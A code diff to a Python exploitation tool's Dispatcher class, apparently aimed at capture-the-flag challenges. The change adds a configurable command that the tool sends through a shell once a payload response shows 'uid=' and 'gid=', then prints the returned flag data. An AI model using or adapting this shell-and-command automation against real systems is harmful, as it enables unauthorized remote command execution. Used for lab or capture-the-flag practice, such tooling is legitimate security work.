@@ -61,6 +61,7 @@ class Dispatcher:
         else:
             raise ValueError("Unsupported mode: {}".format(self.config["mode"]))
 
+        self.cmd_to_send = config.get("cmd_to_send", b"")
     def aslr_enabled(self) -> bool:
         """
         Check if ASLR is enabled for the binary.
@@ -233,6 +234,16 @@ class Dispatcher:
         # Check if the response contains 'uid=' and 'gid='
         if data and b"uid=" in data and b"gid=" in data:
             print_success(f"[+] Find a shell ! With the payload : {payload}.")
+            if self.cmd_to_send:
+                print_success(f"[+] Sending command to get the flag: {self.cmd_to_send}")
+                self.connect()
+                self.send_command(payload, get_return=False)
+                self.receive_response(disable_template=True)
+                self.client.p.send(self.cmd_to_send.encode() + b"\nexit\n")
+                flag_data = self.receive_response(disable_template=True)
+                if flag_data:
+                    print_success(f"[+] Flag data: {flag_data.decode(errors='ignore')}")
+                self.close()
             return True
         return False
 
